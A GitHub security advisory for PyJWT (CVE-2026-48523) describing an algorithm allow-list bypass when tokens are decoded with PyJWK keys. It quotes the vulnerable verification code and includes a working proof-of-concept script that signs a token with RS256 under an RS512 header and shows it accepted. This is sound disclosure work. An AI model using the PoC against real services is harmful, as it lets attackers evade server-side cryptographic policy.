# [M] PyJWT: Algorithm allow-list bypass when decoding with `PyJWK` / `PyJWKClient` keys

## Summary
Severity: Medium
Advisory: GHSA-jq35-7prp-9v3f
CVE: CVE-2026-48523
CWE: CWE-347
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-15
Source: https://github.com/advisories/GHSA-jq35-7prp-9v3f
Type: github-advisory

## Affected
- PyPI: `pyjwt` — affected >=2.9.0 <2.13.0

## Details
> [!NOTE]
> Scored assuming a deployment where algorithm policy functions as an authentication/authorization boundary. In deployments where the algorithm policy enforces crypto agility only, the practical confidentiality impact is lower and the issue is closer to an integrity-of-policy-enforcement bug.

PyJWT `2.9.0` through `2.12.1` allows a verifier-side algorithm allow-list bypass when `jwt.decode()` or `jwt.decode_complete()` are called with a `PyJWK` key. The token header `alg` is checked against the caller-supplied `algorithms` allow-list, but signature verification is performed with the algorithm bound to the `PyJWK` object instead of the header algorithm. An attacker who controls a registered JWK/JWKS private key can sign with a disallowed algorithm, advertise an allowed algorithm in the JWT header, and still be accepted. The issue affects the documented `PyJWKClient.get_signing_key_from_jwt(...)` flow.

### Summary

PyJWT's `PyJWK` verification path allows a verifier-side algorithm allow-list bypass.

In affected versions, when a JWT is decoded with a `PyJWK` object, PyJWT verifies that the header `alg` string is present in the caller's `algorithms=[...]` list, but it does not actually use the header algorithm to verify the signature. Instead, it verifies with the algorithm already bound to the `PyJWK` object.

This lets an attacker who controls a registered JWK/JWKS private key sign with a disallowed algorithm and have the token accepted as long as the JWT header advertises an allowed algorithm. This affects the documented `PyJWKClient` usage flow and does not require any non-default flags or unsafe configuration.

### Details

In `jwt/api_jws.py` in `2.12.1`, `_verify_signature()` treats `PyJWK` keys differently from normal PEM/public-key inputs:

```python
if algorithms is None and isinstance(key, PyJWK):
    algorithms = [key.algorithm_name]

...

if not alg or (algorithms is not None and alg not in algorithms):
    raise InvalidAlgorithmError("The specified alg value is not allowed")

if isinstance(key, PyJWK):
    alg_obj = key.Algorithm
    prepared_key = key.key
else:
    alg_obj = self.get_algorithm_by_name(alg)
    prepared_key = alg_obj.prepare_key(key)
```

This logic means:

1. The JWT header `alg` is checked only as a string against the caller-supplied allow-list.
2. If the key is a `PyJWK`, the actual verifier is not selected from the header algorithm.
3. Instead, PyJWT always verifies with `key.Algorithm`, which is fixed when the `PyJWK` object is created.

`PyJWK` binds its algorithm in `jwt/api_jwk.py` from the JWK's `alg` field or from key-type defaults:

```python
if not algorithm and isinstance(self._jwk_data, dict):
    algorithm = self._jwk_data.get("alg", None)

...

self.algorithm_name = algorithm
self.Algorithm = get_default_algorithms()[algorithm]
self.key = self.Algorithm.from_jwk(self._jwk_data)
```

So once a `PyJWK` is constructed, the verifier uses the `PyJWK`'s bound algorithm, not the JWT header algorithm.

The issue is reachable through the documented JWKS flow. In `docs/usage.rst`, the project documents:

```python
signing_key = jwks_client.get_signing_key_from_jwt(token)
jwt.decode(
    token,
    signing_key,
    audience="https://expenses-api",
    options={"verify_exp": False},
    algorithms=["RS256"],
)
```

`PyJWKClient.get_signing_key_from_jwt()` returns a `PyJWK`, so this documented path is affected.

This is not a "no-key forgery" issue. The attacker still needs control of an accepted JWK/JWKS private key. However, that is realistic in deployments such as:

- self-service OAuth client assertions
- multi-tenant key registration
- federation / BYO-JWKS trust models
- any system where external parties sign JWTs with their own registered keys

In those cases, the attacker can bypass verifier-side algorithm policy. For example, if the server intends to only accept `PS256`, an attacker controlling an accepted RSA JWK can sign with `RS256`, set `alg=PS256` in the JWT header, and still be accepted through the `PyJWK` path.

The same forged token is rejected through the normal PEM/public-key verification path, which shows the bug is specific to `PyJWK` verification rather than expected JWT behavior.

This behavior was introduced by commit `ab8176abe21e550dbc1c9a6bb7e78ad80853bfb1` (`Decode with PyJWK (#886)`), which is present in tagged releases `2.9.0`, `2.10.0`, `2.10.1`, `2.11.0`, `2.12.0`, and `2.12.1`.

### PoC

Tested locally against PyJWT `2.12.1` on Python `3.12.10` with `cryptography 45.0.6`.

Install dependencies:

```bash
python -m pip install pyjwt==2.12.1 cryptography
```

Run the following script:

```python
import json
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from jwt.api_jwk import PyJWK
from jwt.algorithms import RSAAlgorithm
from jwt.utils import base64url_encode

# Generate an RSA keypair controlled by the attacker.
priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = priv.public_key()
pub_pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)

# Build a PyJWK from the public key.
# With an RSA JWK and no explicit alg, PyJWK binds to RS256 by default.
jwk = PyJWK.from_json(RSAAlgorithm.to_jwk(pub))

# Create a token whose protected header claims RS512.
header = {"typ": "JWT", "alg": "RS512"}
payload = {"sub": "alice"}

header_b64 = base64url_encode(
    json.dumps(header, separators=(",", ":"), sort_keys=True).encode()
)
payload_b64 = base64url_encode(
    json.dumps(payload, separators=(",", ":")).encode()
)
signing_input = b".".join([header_b64, payload_b64])

# Sign the RS512-labelled token with RS256 instead.
sig = RSAAlgorithm(RSAAlgorithm.SHA256).sign(signing_input, priv)
token = b".".join([header_b64, payload_b64, base64url_encode(sig)]).decode()

print("token:", token)
print("PyJWK path:")
print(jwt.decode(token, jwk, algorithms=["RS512"]))

print("PEM path:")
try:
    print(jwt.decode(token, pub_pem, algorithms=["RS512"]))
except Exception as e:
    print(f"{type(e).__name__}: {e}")
```

Observed output:

```text
PyJWK path:
{'sub': 'alice'}
PEM path:
InvalidSignatureError: Signature verification failed
```

The token is accepted when the verification key is a `PyJWK`, even though:

- the caller restricted allowed algorithms to `["RS512"]`
- the signature was actually generated with `RS256`

The same token is rejected when verified through the normal PEM/public-key path.

### Impact

This is an algorithm allow-list bypass affecting `jwt.decode()` and `jwt.decode_complete()` when the verification key is a `PyJWK`, including keys returned by `PyJWKClient`.

The impact depends on the deployment model:

- If attackers cannot control any accepted JWK/JWKS private key, practical exploitability is limited.
- If attackers can legitimately control a registered key, this is exploitable.

Impacted deployments include:

- JWT client assertion flows where each client uses its own key
- multitenant systems where tenants register JWK/JWKS material
- federation-style trust models
- any application that relies on `algorithms=[...]` to enforce a crypto policy against externally controlled signing keys

What an attacker can do:

- bypass a server-side requirement such as "only `PS256`" or "only `RS512`"
- continue using a deprecated or blocked algorithm after the server thought it had disabled it
- authenticate successfully as their own client / tenant / federation principal even though they do not satisfy the configured algorithm policy

What this issue does not do by itself:

- it does not let an attacker forge tokens without access to a valid signing key or signing oracle
- it does not automatically enable cross-tenant impersonation unless the surrounding application trust model adds another flaw

## References
- https://github.com/jpadilla/pyjwt/security/advisories/GHSA-jq35-7prp-9v3f
- https://nvd.nist.gov/vuln/detail/CVE-2026-48523
- https://github.com/jpadilla/pyjwt
- https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-176.yaml
